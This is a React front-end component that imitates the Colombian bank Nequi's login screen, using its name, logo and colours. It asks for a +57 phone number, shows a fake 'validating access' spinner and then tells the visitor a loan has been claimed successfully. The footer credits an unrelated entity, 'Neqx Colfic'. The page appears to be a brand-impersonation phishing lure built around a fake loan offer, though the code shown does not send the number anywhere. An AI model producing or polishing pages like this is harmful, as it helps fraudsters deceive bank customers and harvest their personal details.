import React, { useState } from 'react'
import './index.css'

export default function App() {
  const [phone, setPhone] = useState('')
  const [isLoading, setIsLoading] = useState(false)
  const [isValidated, setIsValidated] = useState(false)

  const handleEnter = () => {
    if (!phone) {
      alert('Por favor ingresa tu número')
      return
    }

    // Muestra el mensaje de validación
    setIsLoading(true)

    // Simula validación de acceso durante 3 segundos
    setTimeout(() => {
      setIsLoading(false)
      setIsValidated(true)
    }, 3000)
  }

  return (
    <div className="min-h-screen flex flex-col items-center justify-center bg-[#1C002D] text-white">
      {/* Logo tipo Nequi */}
      <div className="flex flex-col items-center mb-12 animate-fadeIn">
        <div className="flex items-center">
          <div className="w-3 h-3 bg-[#FF00B8] rounded-sm mr-2 animate-pulse"></div>
          <h1
            className="text-6xl font-semibold tracking-wide"
            style={{ fontFamily: 'Poppins, sans-serif', letterSpacing: '0.5px' }}
          >
            Nequi
          </h1>
        </div>
      </div>

      {/* Contenido principal */}
      {!isLoading && !isValidated && (
        <div className="w-80 space-y-3 animate-fadeIn">
          <div className="flex items-center bg-[#3B0B54] text-white rounded-lg px-4 py-3">
            <span className="text-gray-300 mr-2">+57</span>
            <input
              type="tel"
              placeholder="312 567 8900"
              className="bg-transparent outline-none text-white flex-1 placeholder-gray-400"
              value={phone}
              onChange={(e) => setPhone(e.target.value)}
            />
          </div>

          <button
            className="w-full bg-[#FF00B8] hover:bg-[#e000a3] text-white font-medium py-3 rounded-lg transition-all duration-200 shadow-md hover:shadow-lg"
            onClick={handleEnter}
          >
            Entra
          </button>
        </div>
      )}

      {/* Pantalla de validación */}
      {isLoading && (
        <div className="text-center animate-fadeIn">
          <p className="text-lg font-medium mb-2">Validando acceso…</p>
          <div className="w-8 h-8 border-4 border-[#FF00B8] border-t-transparent rounded-full animate-spin mx-auto"></div>
        </div>
      )}

      {/* Mensaje final */}
      {isValidated && (
        <div className="text-center animate-fadeIn">
          <p className="text-lg font-medium text-green-400">
            Préstamo reclamado con éxito<br />
            <span className="text-sm text-gray-400">
              En unos minutos se reflejará en tu cuenta.
            </span>
          </p>
        </div>
      )}

      <p className="text-xs text-gray-400 mt-16 opacity-80">
        Entidad acreditadora digital — Neqx Colfic
      </p>
    </div>
  )
}

